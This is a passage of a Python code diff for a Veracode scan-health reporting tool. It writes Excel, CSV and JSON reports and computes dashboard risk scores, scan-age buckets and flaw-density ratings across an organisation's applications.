+_CW: dict[str, int] = {"App Name":30,"Issues":80,"Recommendations":80,"Module":30,
+    "File":35,"Review Modules URL":50,"Triage Flaws URL":50,"Policy":25,
+    "Business Unit":20,"Selected Module Names":40,"Recommendation":60,"Doc URL":40,
+    "Check Name":22,"Category":18,"Issue Pattern":60,"Top Recommendation":60,
+    "Affected App Names":50,"Business Units":35}
+
+def _hdr(ws: Any, n: int) -> None:
+    for c in range(1,n+1):
+        cl=ws.cell(row=1,column=c); cl.fill=_HF; cl.font=_HN; cl.alignment=_CA; cl.border=_BD
+
+def _sheet(ws: Any, rows: list[dict], hcol: str | None = None, age_col: str | None = None) -> None:
+    if not rows: return
+    hds=list(rows[0].keys()); ws.append(hds); _hdr(ws,len(hds)); ws.freeze_panes="A2"
+    for ri,rd in enumerate(rows,2):
+        for ci,h in enumerate(hds,1):
+            cl=ws.cell(row=ri,column=ci,value=_safe_cell(rd.get(h,""))); cl.font=_DF; cl.border=_BD
+            if hcol and h==hcol:
+                cl.fill=PatternFill("solid",fgColor=_CLR.get(str(rd.get(h,"")),"FFFFFF")); cl.alignment=_CA
+            elif age_col and h==age_col:
+                cl.fill=PatternFill("solid",fgColor=_AGE_CLR.get(str(rd.get(h,"")),"FFFFFF")); cl.alignment=_CA
+            elif h in ("Issues","Recommendations","Recommendation"): cl.alignment=_WA
+            else: cl.alignment=_CA
+    for ci,h in enumerate(hds,1):
+        ws.column_dimensions[get_column_letter(ci)].width=_CW.get(h,14)
+    ws.auto_filter.ref=ws.dimensions
+
+
+def _build_aggregation(agg_issues: list[AggIssue], total_apps: int) -> list[dict]:
+    """Build accurate tenant-level aggregation from structured AggIssue records.
+
+    Groups issues by (check_num, check_name) so each row represents one type of
+    problem across the tenant. Uses the real check metadata rather than regex
+    guesswork on serialized strings.
+    """
+    if not agg_issues:
+        return []
+
+    # Group by check number
+    by_check: dict[int, list[AggIssue]] = {}
+    for ai in agg_issues:
+        by_check.setdefault(ai.check_num, []).append(ai)
+
+    rows: list[dict] = []
+    for check_num in sorted(by_check.keys()):
+        group = by_check[check_num]
+        check_name = group[0].check_name
+        category = group[0].category
+
+        # Highest severity in this group
+        sevs = {ai.severity for ai in group}
+        if "high" in sevs:
+            sev = "HIGH"
+        elif "medium" in sevs:
+            sev = "MEDIUM"
+        else:
+            sev = "LOW"
+
+        # Unique apps
+        unique_apps = list(dict.fromkeys(ai.app_name for ai in group))
+        app_count = len(unique_apps)
+        pct = round(100 * app_count / total_apps, 1) if total_apps else 0
+
+        app_str = ", ".join(unique_apps[:10])
+        if len(unique_apps) > 10:
+            app_str += f" and {len(unique_apps) - 10} others"
+
+        # Unique business units with counts
+        bu_counter: Counter[str] = Counter()
+        for ai in group:
+            if ai.bu: bu_counter[ai.bu] += 1
+        bu_parts = [f"{bu} ({cnt})" for bu, cnt in bu_counter.most_common(10)]
+        bu_str = ", ".join(bu_parts)
+        if len(bu_counter) > 10:
+            bu_str += f" and {len(bu_counter) - 10} others"
+
+        # Total issue occurrences (may exceed app count when one app triggers
+        # multiple sub-issues from the same check, e.g. multiple fatal error types)
+        occurrence_count = len(group)
+
+        # Representative issue: pick the most common normalized pattern
+        pattern_counter: Counter[str] = Counter()
+        for ai in group:
+            clean = re.sub(r'"[^"]*"', '(name)', ai.description)
+            clean = re.sub(r'\b\d+\b', 'N', clean)
+            pattern_counter[clean] += 1
+        sample = pattern_counter.most_common(1)[0][0] if pattern_counter else ""
+
+        # Top recommendation: pick the first non-empty one
+        rec = ""
+        for ai in group:
+            if ai.recommendation:
+                rec = ai.recommendation
+                break
+
+        rows.append({
+            "Check #": check_num,
+            "Check Name": check_name,
+            "Category": category,
+            "Severity": sev,
+            "Apps Affected": app_count,
+            "% of Tenant": pct,
+            "Total Occurrences": occurrence_count,
+            "Affected App Names": app_str,
+            "Business Units": bu_str,
+            "Issue Pattern": sample,
+            "Top Recommendation": rec,
+        })
+
+    # Sort by severity (HIGH first), then by app count descending
+    sev_order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
+    rows.sort(key=lambda r: (sev_order.get(r["Severity"], 3), -r["Apps Affected"]))
+
+    return rows
+
+
+XLSX_MAX_ROWS = 1_048_576   # Excel/openpyxl hard limit
+
+
+def _fit_sheet(rows: list[dict], name: str) -> list[dict]:
+    """Truncate a sheet that cannot physically fit, rather than letting
+    openpyxl raise after the entire (multi-hour) collection run has finished.
+    Only the per-file and per-module sheets can realistically reach this."""
+    limit = XLSX_MAX_ROWS - 1          # one row reserved for the header
+    if len(rows) <= limit:
+        return rows
+    log.error("[!] '%s' has %d rows, exceeding the Excel limit of %d. Writing the "
+              "first %d rows only. Use --output-format csv to keep the full detail.",
+              name, len(rows), XLSX_MAX_ROWS, limit)
+    return rows[:limit]
+
+
+def write_excel(health: list[dict], mods: list[dict], files: list[dict],
+                recs: list[dict], trends: list[dict], agg: list[dict], path: str,
+                dash_bundle: dict | None = None) -> None:
+    health = _fit_sheet(health, "Scan Health Summary")
+    mods = _fit_sheet(mods, "Module Details")
+    files = _fit_sheet(files, "Uploaded Files")
+    recs = _fit_sheet(recs, "Recommendations")
+    wb=Workbook()
+    ws=wb.active; ws.title="Scan Health Summary"
+    if not health: ws["A1"]="No data."; wb.save(path); return
+    _sheet(ws, health, hcol="Health", age_col="Scan Age Bucket")
+    if mods: _sheet(wb.create_sheet("Module Details"), mods)
+    if files: _sheet(wb.create_sheet("Uploaded Files"), files)
+    if recs: _sheet(wb.create_sheet("Recommendations"), recs)
+    if trends: _sheet(wb.create_sheet("Trends"), trends)
+    if agg: _sheet(wb.create_sheet("Tenant Aggregation"), agg)
+    # Overview
+    wso=wb.create_sheet("Tenant Overview")
+    tot=len(health); good=sum(1 for r in health if r.get("Health")=="Good")
+    poor=sum(1 for r in health if r.get("Health")=="Poor")
+    fair=sum(1 for r in health if r.get("Health")=="Fair")
+    ns=sum(1 for r in health if r.get("Scan Status")=="No Scan")
+    ds=[r["Days Since Scan"] for r in health if isinstance(r.get("Days Since Scan"),int)]
+    avg=round(sum(ds)/len(ds),1) if ds else 0
+    stats=[("Report Generated",datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
+           ("Total Applications",tot),("Good Health",good),("Fair",fair),("Poor Health",poor),
+           ("No Scan Found",ns),
+           ("Total Flaws",sum(_si(r.get("Total Flaws")) for r in health)),
+           ("Total Open Affecting Policy",sum(_si(r.get("Open Affecting Policy")) for r in health)),
+           ("Avg Days Since Scan",avg)]
+    wso.column_dimensions["A"].width=40; wso.column_dimensions["B"].width=20
+    wso.append(["Metric","Value"]); _hdr(wso,2)
+    for ri,(k,v) in enumerate(stats,2):
+        wso.cell(row=ri,column=1,value=k).font=_BF; wso.cell(row=ri,column=2,value=v).font=_DF
+        for c in (1,2): wso.cell(row=ri,column=c).border=_BD; wso.cell(row=ri,column=c).alignment=_CA
+    # Executive Dashboard / heatmaps are prepended; the seven sheets above are untouched.
+    if dash_bundle:
+        try:
+            write_dashboard_sheets(wb, dash_bundle["apps"], dash_bundle["issues"],
+                                         dash_bundle["metrics"], dash_bundle["tenant_trend"],
+                                         dash_bundle["issue_rows"], dash_bundle["config"])
+        except Exception as e:
+            log.warning("Dashboard sheet generation failed, core report unaffected: %s", e)
+    wb.save(path); log.info("[+] Report saved: %s", path)
+
+
+def write_csv(health: list[dict], mods: list[dict], files: list[dict],
+              recs: list[dict], trends: list[dict], agg: list[dict], base_path: str) -> None:
+    stem = Path(base_path).stem
+    parent = Path(base_path).parent
+    for name, rows in [("summary",health),("modules",mods),("files",files),
+                       ("recommendations",recs),("trends",trends),("aggregation",agg)]:
+        if not rows: continue
+        p = parent / f"{stem}_{name}.csv"
+        # Union of keys, not just the first row's, so a heterogeneous batch
+        # (e.g. rows carried forward from an older report) cannot raise.
+        fields: list[str] = []
+        for rd in rows:
+            for k in rd:
+                if k not in fields: fields.append(k)
+        with open(p, "w", newline="", encoding="utf-8") as f:
+            w = csv.DictWriter(f, fieldnames=fields, extrasaction="ignore")
+            w.writeheader()
+            for rd in rows:
+                w.writerow({k: _safe_cell(rd.get(k, "")) for k in fields})
+        log.info("[+] CSV: %s", p)
+
+
+def write_json(health: list[dict], mods: list[dict], files: list[dict],
+               trends: list[dict], path: str) -> None:
+    out = {
+        "generated": datetime.now(timezone.utc).isoformat(),
+        "summary": {"total": len(health),
+                     "good": sum(1 for r in health if r.get("Health")=="Good"),
+                     "fair": sum(1 for r in health if r.get("Health")=="Fair"),
+                     "poor": sum(1 for r in health if r.get("Health")=="Poor")},
+        "apps": health, "modules": mods, "files": files,
+        "trends": trends or None,
+    }
+    with open(path, "w", encoding="utf-8") as f:
+        json.dump(out, f, indent=2, default=str)
+    log.info("[+] JSON: %s", path)
+
+
+# ==========================================================================
+# Executive Dashboard layer
+#
+# Pure presentation/scoring. Makes NO Veracode API calls: it consumes the
+# rows already built by the scanner above.
+#   Normalization -> Scoring -> Aggregation -> Visualization -> Export
+# ==========================================================================
+
+# ==========================================================================
+# Configuration
+# ==========================================================================
+
+DASHBOARD_CONFIG: dict[str, Any] = {
+    # Scan recency buckets, in days since the published scan.
+    "scan_age": {
+        "healthy_days": 30,
+        "warning_days": 60,
+        "critical_days": 90,
+    },
+
+    # Count of failing scan-health checks on an application.
+    "health_issues": {
+        "green_max": 0,     # <= this is GREEN
+        "yellow_max": 2,    # <= this is YELLOW, above is RED
+    },
+
+    # Count of HIGH-severity failing checks on an application.
+    "high_severity_issues": {
+        "green_max": 0,
+        "yellow_max": 1,
+    },
+
+    # Security-findings thresholds. Applied to OPEN flaws (not fixed, not
+    # mitigated). "very_high" is Veracode severity 5, "high" is severity 4.
+    "flaws": {
+        # Which signal drives the findings axis:
+        #   "auto"           - use Veracode's own score when the scan reports
+        #                      one, otherwise fall back to density (default)
+        #   "density"        - always use the local severity-weighted density
+        #   "veracode_score" - always use Veracode's score; GRAY when absent
+        "findings_model": "auto",
+
+        # --- Absolute severity floor. Never normalized by app size, because a
+        # single critical is a single critical whether the app ships 5 modules
+        # or 500. Size must not be able to dilute severity. Applies under every
+        # findings model, so a clean score can never mask an open critical.
+        "very_high_orange": 1,   # >= this many open Very High -> at least ORANGE
+        "very_high_red": 3,      # >= this many open Very High -> RED
+        "high_orange": 1,        # >= this many open High      -> at least ORANGE
+        "high_red": 5,           # >= this many open High      -> RED
+
+        # --- Veracode score thresholds (0-100, higher is better).
+        "score_green": 80,       # >= this -> GREEN
+        "score_yellow": 60,      # >= this -> YELLOW, below -> RED
+
+        # --- Size-normalized volume, used when no Veracode score is available.
+        # Flaws are severity-weighted first so 100 lows never equal 20 highs.
+        "severity_weights": {"very_high": 10.0, "high": 5.0, "medium": 1.0, "low": 0.1},
+
+        # Denominator: "analysis_mb" | "selected_modules" | "none".
+        # analysis_mb is the default. It comes from the detailedreport's
+        # analysis_size_bytes, so it already covers only what Veracode actually
+        # analyzed, and it scales continuously with code volume.
+        # selected_modules is also correctly scoped (analyzed entry points) but
+        # far coarser: a single fat JAR divides by 1.
+        # Raw total module count is deliberately NOT offered. It counts
+        # dependencies, and it would let an app failing check #29 (excessive
+        # modules) dilute its own flaw density and look safer on this axis
+        # while failing a scan-health check for the same reason.
+        "density_basis": "analysis_mb",
+        "min_basis": 1.0,        # floor on the denominator; stops tiny apps exploding
+
+        # Weighted flaws per unit of basis. Calibrate against your own tenant:
+        # aggregate_tenant() reports the median and p90 density of each run.
+        "density_yellow": 2.0,
+        "density_red": 8.0,
+    },
+
+    # Attention Score weights. Any component whose input is unavailable is
+    # dropped from BOTH numerator and denominator, so the score stays 0-100
+    # and missing data never silently reads as "healthy".
+    "attention_score": {
+        "scan_health_weight": 30,
+        "scan_age_weight": 20,
+        "flaw_weight": 25,
+        "high_severity_issue_weight": 15,
+        "trend_weight": 10,
+        "data_quality_weight": 10,
+        # Ceiling applied to profiles with no published scan results. Without
+        # it, every never-scanned profile scores 100 and crowds genuinely
+        # measured high-risk applications out of the Top 10. An unmeasured
+        # application is a real gap, but it is not evidence of immediate risk.
+        # Set to 100 to disable the cap.
+        "never_scanned_cap": 70,
+    },
+
+    # Attention Score bands: (min, max, label, risk_level)
+    "attention_bands": [
+        (0, 19, "Normal", "GREEN"),
+        (20, 39, "Monitor", "GREEN"),
+        (40, 59, "Attention Required", "YELLOW"),
+        (60, 79, "High Priority", "ORANGE"),
+        (80, 100, "Immediate Attention", "RED"),
+    ],
+
+    # Organisational issue prevalence, as a share of the tenant.
+    "issue_prevalence": {
+        "widespread_pct": 20.0,
+        "common_pct": 5.0,
+    },
+
+    "top_n_attention": 10,
+    "top_n_issues": 10,
+
+    "colors": {
+        "GREEN": "2E7D32",
+        "YELLOW": "F9A825",
+        "ORANGE": "EF6C00",
+        "RED": "C62828",
+        "GRAY": "9E9E9E",
+    },
+    # Softer fills for large table bodies; text stays readable.
+    "fills": {
+        "GREEN": "D6EAD7",
+        "YELLOW": "FDF0CC",
+        "ORANGE": "FBDFC8",
+        "RED": "F4D3D3",
+        "GRAY": "E8E8E8",
+    },
+}
+
+DISCLAIMER = (
+    "Scan health indicates the quality and currency of security analysis. "
+    "A healthy scan does not mean an application has no security vulnerabilities."
+)
+
+RISK_ORDER = {"RED": 0, "ORANGE": 1, "YELLOW": 2, "GREEN": 3, "GRAY": 4}
+
+# Human-readable labels for the 31 checks, and the highest severity each check
+# is capable of emitting. Used so the organisational heatmap can list every
+# check, including the ones that nothing triggered.
+CHECK_CATALOG: dict[int, tuple[str, str]] = {
+    1:  ("Unnecessary / junk files uploaded", "medium"),
+    2:  ("Third-party component selected as entry point", "medium"),
+    3:  ("Implausible flaw count (zero or excessive)", "medium"),
+    4:  ("Fatal scan errors", "high"),
+    5:  ("Unscannable Java modules", "high"),
+    6:  ("Unwanted file types uploaded", "medium"),
+    7:  ("Nested archives", "high"),
+    8:  ("Missing precompiled .NET views", "high"),
+    9:  ("Missing SCA results", "medium"),
+    10: ("JavaScript modules not selected", "medium"),
+    11: ("Unexpected source code uploaded", "high"),
+    12: ("Missing supporting files", "medium"),
+    13: ("Missing debug symbols (PDB)", "medium"),
+    14: ("Unsupported platform or compiler", "high"),
+    15: ("Gradle wrapper selected for analysis", "high"),
+    16: ("Sensitive files uploaded", "high"),
+    17: ("Source repository uploaded", "medium"),
+    18: ("node_modules uploaded", "medium"),
+    19: ("Testing artefacts uploaded or selected", "high"),
+    20: ("Excessive uploaded file count", "medium"),
+    21: ("Excess Microsoft runtime components", "medium"),
+    22: ("Loose Java class files", "medium"),
+    23: ("Go workspace detected", "medium"),
+    24: ("First-party modules not selected", "medium"),
+    25: ("Over-scanning (dependencies of selected modules)", "medium"),
+    26: ("Dependencies selected as entry points", "medium"),
+    27: ("Duplicate files uploaded", "high"),
+    28: ("Minified JavaScript uploaded", "medium"),
+    29: ("Excessive module count", "medium"),
+    30: ("Application not scanned recently", "medium"),
+    31: ("Analysis or upload size over threshold", "medium"),
+}
+
+DEFAULT_CHECK_CATEGORIES: dict[int, str] = CHECK_CATEGORIES
+
+
+# ==========================================================================
+# Small helpers
+# ==========================================================================
+
+def _i(v: Any, d: int = 0) -> int:
+    try:
+        if v is None or v == "":
+            return d
+        return int(v)
+    except (ValueError, TypeError):
+        return d
+
+
+def _f(v: Any, d: float = 0.0) -> float:
+    try:
+        if v is None or v == "":
+            return d
+        return float(v)
+    except (ValueError, TypeError):
+        return d
+
+
+def _pct(num: float, den: float, nd: int = 1) -> float:
+    """Percentage that never divides by zero."""
+    if not den:
+        return 0.0
+    return round(100.0 * num / den, nd)
+
+
+def _ctx(num: int, den: int, nd: int = 1) -> str:
+    """'43 / 250 (17.2%)' -- never hide the denominator."""
+    return f"{num:,} / {den:,} ({_pct(num, den, nd)}%)"
+
+
+def _clamp(v: float, lo: float = 0.0, hi: float = 1.0) -> float:
+    return max(lo, min(hi, v))
+
+
+def _worst(*levels: str) -> str:
+    """Worst (most severe) risk level of those supplied, ignoring GRAY unless
+    it is the only input."""
+    known = [l for l in levels if l and l != "GRAY"]
+    if not known:
+        return "GRAY"
+    return min(known, key=lambda l: RISK_ORDER.get(l, 99))
+
+
+# ==========================================================================
+# Intermediate model
+# ==========================================================================
+
+@dataclass
+class HealthIssue:
+    """One failing health check on one application profile."""
+    app_id: str = ""
+    app_name: str = ""
+    sandbox: str = ""
+    business_unit: str = ""
+    check_number: int = 0
+    check_name: str = ""
+    check_label: str = ""
+    category: str = ""
+    severity: str = ""          # high | medium | low
+    status: str = "FAILED"
+    description: str = ""
+    recommendation: str = ""
+
+
+@dataclass
+class ApplicationHealth:
+    """Normalized, dashboard-ready view of one application profile."""
+    app_id: str = ""
+    app_name: str = ""
+    sandbox: str = ""
+    business_unit: str = ""
+    policy: str = ""
+    build_id: str = ""
+
+    scan_status: str = ""
+    health_status: str = "Unknown"      # Good | Fair | Poor | Unknown
+    ever_scanned: bool = False
+
+    last_scan_date: str = ""
+    scan_age_days: int | None = None
+    scan_age_bucket: str = "Never scanned"
+
+    # Security findings. None means "not available", which is NOT zero.
+    critical_flaws: int | None = None    # Veracode Very High (severity 5)
+    high_flaws: int | None = None
+    medium_flaws: int | None = None
+    low_flaws: int | None = None
+    total_flaws: int = 0
+    open_policy_flaws: int = 0
+    flaw_severity_available: bool = False
+
+    veracode_score: int | None = None      # Veracode's own 0-100 scan score
+    veracode_rating: str = ""
+    policy_status: str = ""
+    findings_basis: str = ""               # which signal drove the findings axis
+
+    weighted_flaw_load: float = 0.0
+    flaw_density: float | None = None      # None when the basis is unavailable
+    density_basis_value: float = 0.0
+    density_basis_label: str = ""
+
+    sca_component_count: int = 0
+    sca_status: str = "Unknown"          # Present | Missing | Unknown
+    analysis_size_mb: float = 0.0
+    total_upload_mb: float = 0.0
+    files_uploaded: int = 0
+    total_modules: int = 0
+    selected_modules: int = 0
+    fatal_errors: int = 0
+
+    health_issue_count: int = 0
+    high_severity_issue_count: int = 0
+    medium_severity_issue_count: int = 0
+    failed_checks: list[int] = field(default_factory=list)
+    recommendations: list[str] = field(default_factory=list)
+    top_issue: str = ""
+
+    previous_health: str = ""
+    health_trend: str = "Unknown"        # Improving | Stable | Declining | New | Unknown
+
+    attention_score: int = 0
+    attention_band: str = ""
+    attention_level: str = "GRAY"
+    attention_drivers: list[str] = field(default_factory=list)
+
+    # Two independent dimensions, deliberately never merged.
+    scan_health_risk: str = "GRAY"
+    security_findings_risk: str = "GRAY"
+    quadrant: str = ""
+
+    review_url: str = ""
+    triage_url: str = ""
+
+    @property
+    def key(self) -> str:
+        return f"{self.app_id}|{self.sandbox}"
+
+    @property
+    def display_name(self) -> str:
+        return f"{self.app_name} [{self.sandbox}]" if self.sandbox else self.app_name
+
+
+# ==========================================================================
+# Normalization
+# ==========================================================================
+
+def _dash_age_bucket(days: int | None, cfg: dict) -> str:
+    if days is None:
+        return "Never scanned"
+    a = cfg["scan_age"]
+    if days <= a["healthy_days"]:
+        return f"<={a['healthy_days']}d"
+    if days <= a["warning_days"]:
+        return f"{a['healthy_days'] + 1}-{a['warning_days']}d"
+    if days <= a["critical_days"]:
+        return f"{a['warning_days'] + 1}-{a['critical_days']}d"
+    return f">{a['critical_days']}d"
+
+
+def _scan_age_risk(days: int | None, cfg: dict) -> str:
+    if days is None:
+        return "GRAY"
+    a = cfg["scan_age"]
+    if days <= a["healthy_days"]:
+        return "GREEN"
+    if days <= a["warning_days"]:
+        return "YELLOW"
+    if days <= a["critical_days"]:
+        return "ORANGE"
+    return "RED"
+
+
+def _health_risk(health: str) -> str:
+    return {"Good": "GREEN", "Fair": "YELLOW", "Poor": "RED"}.get(health, "GRAY")
+
+
+def _issue_count_risk(n: int, bounds: dict) -> str:
+    if n <= bounds["green_max"]:
+        return "GREEN"
+    if n <= bounds["yellow_max"]:
+        return "YELLOW"
+    return "RED"
+
+
+def flaw_weighted_load(app: ApplicationHealth, cfg: dict) -> float:
+    """Severity-weighted count of open flaws.
+
+    Weighting happens before any normalization so that a large pile of low
+    findings can never add up to a handful of high ones.
+    """
+    w = cfg["flaws"]["severity_weights"]
+    return (w["very_high"] * (app.critical_flaws or 0)
+            + w["high"] * (app.high_flaws or 0)
+            + w["medium"] * (app.medium_flaws or 0)
+            + w["low"] * (app.low_flaws or 0))
+
+
+def flaw_density_basis(app: ApplicationHealth, cfg: dict) -> tuple[float, str]:
+    """Denominator used to normalize flaw volume for application size."""
+    basis = cfg["flaws"]["density_basis"]
+    if basis == "analysis_mb":
+        return app.analysis_size_mb, "MB analyzed"
+    if basis == "selected_modules":
+        return float(app.selected_modules), "selected module"
+    return 1.0, "application"
+
+
+def _join_basis(existing: str, addition: str) -> str:
+    return f"{existing}; {addition}" if existing else addition
+
+
+def _severity_floor(app: ApplicationHealth, cfg: dict) -> str:
+    """Risk implied by severity alone, before any size normalization.
+
+    This is a floor, not a ratio. Application size can never pull it down, and
+    no favourable score can mask it.
+    """
+    t = cfg["flaws"]
+    vh, hi = app.critical_flaws or 0, app.high_flaws or 0
+    if vh >= t["very_high_red"] or hi >= t["high_red"]:
+        return "RED"
+    if vh >= t["very_high_orange"] or hi >= t["high_orange"]:
+        return "ORANGE"
+    return "GREEN"
+
+
+def _flaw_risk(app: ApplicationHealth, cfg: dict) -> str:
+    """Security-findings risk.
+
+    Severity floor first, then a volume signal that accounts for application
+    size. The volume signal is Veracode's own scan score where the scan reports
+    one, since that is already severity-weighted and size-adjusted, and a local
+    severity-weighted density otherwise.
+
+    GRAY when severity data is unavailable, because a flaw total without
+    severities cannot be classified honestly.
+    """
+    if not app.ever_scanned or not app.flaw_severity_available:
+        return "GRAY"
+    t = cfg["flaws"]
+    floor = _severity_floor(app, cfg)
+    vh, hi = app.critical_flaws or 0, app.high_flaws or 0
+    if floor != "GREEN":
+        parts = []
+        if vh:
+            parts.append(f"{vh} open very-high")
+        if hi:
+            parts.append(f"{hi} open high")
+        app.findings_basis = "Severity floor: " + ", ".join(parts)
+    if floor == "RED":
+        return "RED"
+
+    model = t.get("findings_model", "auto")
+    use_score = (app.veracode_score is not None
+                 and model in ("auto", "veracode_score"))
+
+    if use_score:
+        app.findings_basis = _join_basis(app.findings_basis, f"Veracode score {app.veracode_score}")
+        sc = app.veracode_score
+        if sc < t["score_yellow"]:
+            return "RED"
+        if sc < t["score_green"]:
+            return _worst(floor, "YELLOW")
+        return floor
+
+    if model == "veracode_score":
+        # Explicitly requested but unavailable. Do not silently substitute.
+        app.findings_basis = _join_basis(app.findings_basis, "Veracode score unavailable")
+        return floor if floor != "GREEN" else "GRAY"
+
+    if app.flaw_density is None:
+        # Cannot normalize. Report unknown rather than assuming a large flaw
+        # count is fine, but never discard a severity signal already in hand.
+        app.findings_basis = _join_basis(app.findings_basis, "Size unknown; volume not normalized")
+        if floor != "GREEN":
+            return floor
+        return "GRAY" if app.weighted_flaw_load > 0 else "GREEN"
+
+    app.findings_basis = _join_basis(app.findings_basis, f"{app.flaw_density} weighted flaws per {app.density_basis_label}")
+    if app.flaw_density >= t["density_red"]:
+        return "RED"
+    if app.flaw_density >= t["density_yellow"]:
+        return _worst(floor, "YELLOW")
+    return floor
+
+
+def _sca_risk(status: str) -> str:
+    return {"Present": "GREEN", "Missing": "RED", "Unknown": "GRAY"}.get(status, "GRAY")
+
+
+def _trend_risk(trend: str) -> str:
+    return {"Improving": "GREEN", "Stable": "GRAY",
+            "Declining": "RED", "New": "GRAY", "Unknown": "GRAY"}.get(trend, "GRAY")
+
+
+def _quadrant(app: ApplicationHealth) -> str:
+    """Priority matrix placement. X axis is scan-health risk, Y axis is
+    security-findings risk. Built only from indicators the scanner actually
+    produces; no business criticality is invented."""
+    sh_bad = app.scan_health_risk in ("RED", "ORANGE")
+    sf_bad = app.security_findings_risk in ("RED", "ORANGE")
+    if app.scan_health_risk == "GRAY" and app.security_findings_risk == "GRAY":
+        return "Insufficient Data"
+    if sf_bad and sh_bad:
+        return "Immediate"
+    if sf_bad and not sh_bad:
+        return "Review"
+    if sh_bad and not sf_bad:
+        return "Attention"
+    return "Monitor"
+
+
+def build_application_health(
+    health_rows: Sequence[dict],
+    issue_records: Sequence[dict] | None = None,
+    prev_rows: dict | None = None,
+    cfg: dict | None = None,
+    check_categories: dict[int, str] | None = None,
+) -> tuple[list[ApplicationHealth], list[HealthIssue]]:
+    """Normalize scanner output into the dashboard model.
+
+    Matching against the previous report is done on App ID first so that
+    renamed applications are still tracked, falling back to name.
+    """
+    cfg = cfg or DASHBOARD_CONFIG
+    cats = check_categories or DEFAULT_CHECK_CATEGORIES
+    issue_records = issue_records or []
+    prev_rows = prev_rows or {}
+
+    # ---- index the previous report by (app_id, sandbox) and (name, sandbox)
+    prev_by_id: dict[tuple[str, str], dict] = {}
+    prev_by_name: dict[tuple[str, str], dict] = {}
+    for row in prev_rows.values():
+        sbx = str(row.get("Sandbox") or "")
+        aid = str(row.get("App ID") or "")
+        if aid:
+            prev_by_id[(aid, sbx)] = row
+        prev_by_name[(str(row.get("App Name") or ""), sbx)] = row
+
+    # ---- index structured issues by (app_name, sandbox); AggIssue carries no
+    #      app_id, so this is the only join key available.
+    issues_by_app: dict[tuple[str, str], list[dict]] = {}
+    for rec in issue_records:
+        k = (str(rec.get("app_name", "")), str(rec.get("sandbox", "") or ""))
+        issues_by_app.setdefault(k, []).append(rec)
+
+    apps: list[ApplicationHealth] = []
+    all_issues: list[HealthIssue] = []
+
+    for row in health_rows:
+        name = str(row.get("App Name", "") or "")
+        sbx = str(row.get("Sandbox", "") or "")
+        app_id = str(row.get("App ID", "") or "")
+        scan_status = str(row.get("Scan Status", "") or "")
+        published = str(row.get("Published", "") or "")
+
+        days_raw = row.get("Days Since Scan")
+        days = days_raw if isinstance(days_raw, int) else None
+        if isinstance(days_raw, str) and days_raw.isdigit():
+            days = int(days_raw)
+
+        ever_scanned = bool(published) and scan_status not in ("No Scan", "No Results")
+
+        raw_health = str(row.get("Health", "") or "")
+        # The scanner assigns Poor to never-scanned profiles. For the dashboard
+        # that is unknown, not measured-and-bad.
+        health = raw_health if ever_scanned else "Unknown"
+
+        sev_flag = str(row.get("Flaw Severity Data", "") or "")
+        sev_available = ever_scanned and sev_flag == "Available"
+
+        sca_count = _i(row.get("SCA Components"))
+        # SCA presence is authoritative from check #9, not from the count of
+        # vulnerable components (zero vulnerable components is a good outcome).
+        app_issue_recs = issues_by_app.get((name, sbx), [])
+        failed_nums = sorted({_i(r.get("check_num")) for r in app_issue_recs})
+        if not ever_scanned:
+            sca_status = "Unknown"
+        elif 9 in failed_nums:
+            sca_status = "Missing"
+        else:
+            sca_status = "Present"
+
+        app = ApplicationHealth(
+            app_id=app_id,
+            app_name=name,
+            sandbox=sbx,
+            business_unit=str(row.get("Business Unit", "") or ""),
+            policy=str(row.get("Policy", "") or ""),
+            build_id=str(row.get("Build ID", "") or ""),
+            scan_status=scan_status,
+            health_status=health,
+            ever_scanned=ever_scanned,
+            last_scan_date=published,
+            scan_age_days=days,
+            scan_age_bucket=_dash_age_bucket(days, cfg),
+            total_flaws=_i(row.get("Total Flaws")),
+            open_policy_flaws=_i(row.get("Open Affecting Policy")),
+            flaw_severity_available=sev_available,
+            veracode_score=(_i(row.get("Veracode Score")) if str(row.get("Veracode Score", "")).strip() != "" else None),
+            veracode_rating=str(row.get("Veracode Rating", "") or ""),
+            policy_status=str(row.get("Policy Status", "") or ""),
+            sca_component_count=sca_count,
+            sca_status=sca_status,
+            analysis_size_mb=_f(row.get("Analysis Size (MB)")),
+            total_upload_mb=_f(row.get("Total Upload Size (MB)")),
+            files_uploaded=_i(row.get("Files Uploaded")),
+            total_modules=_i(row.get("Total Modules")),
+            selected_modules=_i(row.get("Selected Modules")),
+            fatal_errors=_i(row.get("Fatal Errors")),
+            health_issue_count=_i(row.get("Total Issues")),
+            high_severity_issue_count=_i(row.get("High Issues")),
+            medium_severity_issue_count=_i(row.get("Medium Issues")),
+            failed_checks=failed_nums,
+            review_url=str(row.get("Review Modules URL", "") or ""),
+            triage_url=str(row.get("Triage Flaws URL", "") or ""),
+        )
+
+        if sev_available:
+            app.critical_flaws = _i(row.get("Open Very High Flaws"))
+            app.high_flaws = _i(row.get("Open High Flaws"))
+            app.medium_flaws = _i(row.get("Open Medium Flaws"))
+            app.low_flaws = _i(row.get("Open Low Flaws"))
+
+        recs = str(row.get("Recommendations", "") or "")
+        app.recommendations = [r.strip() for r in recs.split("; ") if r.strip() and r != "None"]
+
+        # ---- structured issues
+        for rec in app_issue_recs:
+            num = _i(rec.get("check_num"))
+            label = CHECK_CATALOG.get(num, ("Check %d" % num, "medium"))[0]
+            hi = HealthIssue(
+                app_id=app_id, app_name=name, sandbox=sbx,
+                business_unit=app.business_unit,
+                check_number=num,
+                check_name=str(rec.get("check_name", "") or ""),
+                check_label=label,
+                category=str(rec.get("category", "") or cats.get(num, "Other")),
+                severity=str(rec.get("severity", "") or "medium"),
+                description=str(rec.get("description", "") or ""),
+                recommendation=str(rec.get("recommendation", "") or ""),
+            )
+            all_issues.append(hi)
+
+        # Top issue: worst severity, then the check with the highest severity rank.
+        highs = [i for i in app_issue_recs if str(i.get("severity")) == "high"]
+        pool = highs or app_issue_recs
+        if pool:
+            n = _i(pool[0].get("check_num"))
+            app.top_issue = CHECK_CATALOG.get(n, (str(pool[0].get("description", ""))[:80], ""))[0]
+        elif not ever_scanned:
+            app.top_issue = "No published scan results"
+
+        # ---- trend, matched on App ID first
+        prow = prev_by_id.get((app_id, sbx)) if app_id else None
+        if prow is None:
+            prow = prev_by_name.get((name, sbx))
+        if prev_rows:
+            if prow is None:
+                app.health_trend = "New"
+                app.previous_health = ""
+            else:
+                app.previous_health = str(prow.get("Health", "") or "")
+                app.health_trend = _classify_trend(app.previous_health, health)
+        else:
+            app.health_trend = "Unknown"
+
+        # ---- risk dimensions
